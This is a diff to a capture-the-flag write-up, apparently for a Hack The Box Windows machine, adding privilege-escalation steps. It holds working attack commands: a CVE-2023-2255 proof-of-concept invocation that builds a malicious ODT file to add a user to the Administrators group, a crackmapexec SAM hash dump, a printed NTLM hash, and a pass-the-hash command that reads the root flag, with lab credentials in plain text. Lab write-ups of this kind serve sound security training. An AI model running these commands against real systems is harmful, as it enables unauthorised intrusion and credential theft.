@@ -49,3 +49,33 @@ evil-winrm -i 10.129.231.40 -u maya -p 'm4y4ngs4ri'
 
 
 m4y4ngs4ri
+
+
+
+after using winpeas we can see some interesting things :&#x20;
+
+<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://github.com/elweth-sec/CVE-2023-2255" %}
+
+in order to exploit this CVE we have first to generate a malicious odt file  with our injected&#x20;
+
+```
+python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'file.odt'
+```
+
+<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+
+
+
+crackmapexec smb 10.129.231.40 -u maya -p "m4y4ngs4ri" --sam
+
+
+
+<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+
+localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::
+
+crackmapexec smb 10.129.231.40 -u localadmin -H "aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae" -x "cmd.exe /c type c:\users\localadmin\Desktop\root.txt"
